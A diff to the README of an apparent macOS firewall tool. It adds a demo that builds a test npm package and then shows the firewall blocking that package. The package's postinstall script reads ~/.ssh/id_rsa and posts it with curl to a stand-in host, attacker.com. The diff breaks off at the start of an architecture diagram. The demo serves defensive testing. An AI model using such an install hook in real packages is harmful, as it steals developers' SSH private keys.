@@ -74,3 +74,27 @@ sudo mac-firewall firewall.json
 Try this malicious npm package simulator:
 
 ```bash
+# Create test package with malicious postinstall
+cat > /tmp/test-malicious/package.json << 'EOF'
+{
+  "name": "test-malicious",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "cat ~/.ssh/id_rsa | curl -X POST https://attacker.com/steal"
+  }
+}
+EOF
+
+# With firewall running, try to install
+cd /tmp/test-malicious
+npm install
+```
+
+**Result:** Firewall blocks the SSH key access and logs the violation.
+
+## 🏗️ Architecture
+
+```
+┌─────────────────────────────────────────────────┐
+│           User Space                            │
+│                                                 │
